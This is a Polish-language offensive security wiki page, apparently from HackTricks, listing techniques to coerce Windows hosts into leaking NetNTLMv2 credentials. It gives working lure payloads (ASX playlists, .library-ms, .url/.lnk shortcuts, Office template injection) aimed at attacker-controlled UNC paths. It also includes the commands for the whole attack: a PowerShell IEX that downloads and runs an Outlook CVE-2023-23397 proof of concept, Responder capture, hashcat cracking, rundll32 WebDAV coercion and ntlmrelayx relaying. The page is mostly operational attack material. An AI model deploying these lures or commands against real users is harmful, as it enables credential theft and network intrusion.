# Miejsca do kradzieży NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) od pobrania pliku microsoft word online po źródła ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisywać do share, po którym użytkownicy lub zadania harmonogramu poruszają się w Explorer**, wrzuć pliki, których metadane wskazują na Twój UNC (np. `\\ATTACKER\share`). Renderowanie folderu wyzwala **implicit SMB authentication** i ujawnia **NetNTLMv2** do Twojego listener.

1. **Generate lures** (obejmuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Wrzuć je na writable share** (dowolny folder, który otwiera ofiara):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Nasłuchuj i crackuj**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows może trafić w kilka plików naraz; wszystko, co Explorer podgląda (`BROWSE TO FOLDER`), nie wymaga kliknięć.

### Windows Media Player playlists (.ASX/.WAX)

Jeśli uda Ci się nakłonić cel do otwarcia lub podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz leakować Net‑NTLMv2, wskazując wpis na ścieżkę UNC. WMP spróbuje pobrać wskazane media przez SMB i uwierzytelni się automatycznie.

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ collection i cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer niebezpiecznie obsługuje pliki .library-ms, gdy są otwierane bezpośrednio z wnętrza archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchomienie pliku .library-ms wewnątrz ZIP powoduje, że Explorer enumeruje UNC i wysyła uwierzytelnienie NTLM do atakującego. Daje to NetNTLMv2, który można złamać offline lub potencjalnie relayować.

Minimal .library-ms wskazujący na UNC atakującego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML (ustaw swój IP/hostname).
- Spakuj go do ZIP (w Windows: Send to → Compressed (zipped) folder) i dostarcz ZIP do celu.
- Uruchom listener do przechwytywania NTLM i poczekaj, aż ofiara otworzy .library-ms z wnętrza ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook dla Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała na UNC path (np. \\attacker\share\alert.wav), Outlook łączył się z SMB share, gdy uruchamiał się reminder, powodując leak Net‑NTLMv2 użytkownika bez żadnego kliknięcia. Zostało to załatane 14 marca 2023, ale nadal ma duże znaczenie dla starszych/nietkniętych środowisk oraz dla historycznej incident response.

Szybka exploitation z PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Po stronie listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Uwagi
- Ofiara musi mieć uruchomiony Outlook for Windows tylko wtedy, gdy przypomnienie się uruchamia.
- leak daje Net‑NTLMv2 odpowiedni do offline cracking albo relay (nie pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer automatycznie renderuje ikony shortcutów. Najnowsze badania pokazały, że nawet po kwietniowej łatce Microsoftu z 2025 roku dla shortcutów z ikonami UNC nadal było możliwe wywołanie uwierzytelniania NTLM bez kliknięć, poprzez hostowanie celu shortcutu na ścieżce UNC i pozostawienie ikony lokalnej (bypass łatki oznaczony jako CVE-2025-50154). Samo wyświetlenie folderu powoduje, że Explorer pobiera metadane z zdalnego celu, wysyłając NTLM do serwera SMB atakującego.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) przez PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Pomysły na dostarczenie
- Umieść shortcut w ZIP i spraw, by ofiara go przeglądała.
- Umieść shortcut na zapisywalnym share, który ofiara otworzy.
- Połącz z innymi plikami lure w tym samym folderze, aby Explorer podglądał elementy.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows ładuje metadane `.lnk` podczas **view/preview** (renderowania ikony), a nie tylko przy wykonaniu. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że shell rozwiązuje ścieżkę ikony i dotyka filesystem **podczas ładowania**, emitując outbound NTLM, gdy ścieżka jest zdalna.

Kluczowe warunki wyzwolenia (zaobserwowane w `CShellLink::_LoadFromStream`):
- Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (bramka do rutyny aktualizacji ikony).
- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym **TargetUnicode**.
- Loader rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` na wynikowej ścieżce.

Jeśli `TargetUnicode` rozwiąże się do ścieżki UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego shortcut powoduje outbound authentication. Ta sama ścieżka ładowania może być też wywołana przez **indexing** i **AV scanning**, co czyni to praktycznym no-click leak surface.

Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe**, aby budować/inspekcjonować te struktury bez użycia Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Natywny **WebDAV client** może być nadużyty, aby wymusić na bieżącej sesji logowania uwierzytelnienie do dowolnego punktu końcowego **HTTP/WebDAV**:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Dlaczego to jest przydatne:
- Przeciwko **serwerowi WebDAV kontrolowanemu przez atakującego** może wywołać **NTLM over HTTP** bez uruchamiania własnego klienta.
- Przeciwko **wewnętrznym hostom** jest to cichy sposób na **sprawdzenie, gdzie skradzione credentials są akceptowane** przed dalszym ruchem lateralnym.
- To polecenie jest dobrą alternatywą, gdy **SMB egress jest filtrowany**, ale **HTTP/WebDAV** nadal jest osiągalny.

Uwagi operacyjne:
- Usługa **WebClient** musi być uruchomiona na hostie źródłowym.
- `rundll32.exe` ładuje `davclnt.dll` i powoduje, że Windows obsługuje uwierzytelnianie WebDAV przy użyciu **current user's credentials**.
- Jeśli wskazujesz na infrastrukturę, którą kontrolujesz, użyj HTTP listener/relay świadomego NTLM, takiego jak:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Z perspektywy detekcji, wielokrotne uruchomienia `rundll32.exe davclnt.dll,DavSetCookie` przeciwko wielu systemom wewnętrznym są mocnym sygnałem **credential validation / spray-like lateral movement prep** zamiast normalnego zachowania użytkownika.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego template. Jeśli ustawisz dołączony template na ścieżkę UNC, otwarcie dokumentu uwierzytelni się do SMB.

Minimalne zmiany relacji DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj referencję do dołączonego template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj word/_rels/settings.xml.rels i wskaż rId1337 na swój UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Przepakuj do .docx i dostarcz. Uruchom swój listener przechwytywania SMB i czekaj na otwarcie.

Po pomysły po przechwyceniu dotyczące relay lub abuse NTLM, sprawdź:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
